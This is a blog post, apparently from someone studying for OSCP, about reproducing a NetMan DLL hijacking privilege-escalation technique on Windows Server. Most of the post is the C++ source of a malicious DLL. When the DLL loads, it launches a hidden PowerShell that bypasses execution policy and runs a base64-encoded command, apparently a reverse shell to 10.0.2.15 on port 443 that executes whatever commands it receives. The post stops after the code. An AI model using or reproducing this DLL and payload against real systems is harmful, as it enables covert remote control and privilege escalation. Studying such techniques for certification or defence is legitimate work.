<H1>Weaponizing NetMan DLL Hijacking gone wrong?</H1>  

<p>In my hunt for OSCP certificate I was going through Windows Priviledge escalation techniques. Specifically DLL hijacking. I stumbled upon an <a href="https://twitter.com/itm4n">@itm4n</a>'s great article about <a href="https://itm4n.github.io/windows-server-netman-dll-hijacking/">NetMan DLL Hijacking</a>.</p>

<p>His article explains how all editions of Windows Server, from 2008R2 to 2019 should be prone to DLL Hijacking because of missing DLL suggesting we have an account with permissions to write into %PATH%. I won't explain everything in detail here, go read his <a href="https://itm4n.github.io/windows-server-netman-dll-hijacking/">article</a>.</p>  

<p>So I thought I will give it a shot and will try to exploit this with his POC. I created malicious DLL:</p>

```C++

// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"

// Standard dllmain api entry created by VS
BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        // Our malicious code.
        WinExec("powershell -nop -noni -w Hidden -ep Bypass -e JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAIgAxADAALgAwAC4AMgAuADEANQAiACwANAA0ADMAKQA7AAoAJABzAD0AJABjAC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsACgBbAGIAeQB0AGUAWwBdAF0AJABiAD0AMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AAoAdwBoAGkAbABlACgAKAAkAGkAPQAkAHMALgBSAGUAYQBkACgAJABiACwAIAAwACwAIAAkAGIALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQAKAHsACgAJACQAZAA9ACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AdAAgAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgAsADAALAAkAGkALQAxACkAOwAKAAkAaQBmACgAJABkACAALQBlAHEAIAAiAGUAeABpAHQAIgApAHsAYgByAGUAYQBrAH0ACgAJACQAcwBiAD0AaQBmACgAJABpACAALQBnAHQAIAAxACkAIAB7AHQAcgB5ACAAewBpAGUAeAAgACIAJABkACAAMgA+ACYAMQAiACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAfQAgAGMAYQB0AGMAaAAgAHsAJABfACAAfAAgAE8AdQB0AC0AcwB0AHIAaQBuAGcAfQB9ACAAZQBsAHMAZQB7ACIAIgB9ADsACgAJACQAcwBiADIAPQAkAHMAYgArACIAUABTACAAIgArACgAcAB3AGQAKQAuAFAAYQB0AGgAKwAiAD4AIAAiADsACgAJACQAcwBkAGIAPQAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBiADIAKQAKAAkAJABzAC4AVwByAGkAdABlACgAJABzAGQAYgAsADAALAAkAHMAZABiAC4ATABlAG4AZwB0AGgAKQA7AAoACQAkAHMALgBGAGwAdQBzAGgAKAApAAoAfQA7AAoAJABjAC4AQwBsAG8AcwBlACgAKQA=", SW_HIDE);
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```


